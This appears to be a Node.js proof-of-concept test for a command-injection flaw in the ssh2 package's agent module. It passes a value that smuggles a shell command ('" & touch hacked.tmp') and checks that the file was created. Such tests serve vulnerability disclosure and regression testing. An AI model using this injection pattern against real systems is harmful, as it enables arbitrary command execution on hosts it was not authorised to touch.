const { test } = require("node:test");
const { equal } = require("node:assert");
const { existsSync, rmSync } = require("node:fs");

test("Vulnerable to Command Injection", async () => {
  const agent = require("ssh2/lib/agent");

  // Promisfy
  const result = await new Promise((resolve, reject) => {
    agent('" & touch hacked.tmp', (e) => {
      resolve(e);
    });
  });

  equal(result, "test");

  // Check if the file was created
  equal(existsSync("hacked.tmp"), true);

  // Clean up the created file
  rmSync("hacked.tmp");
});
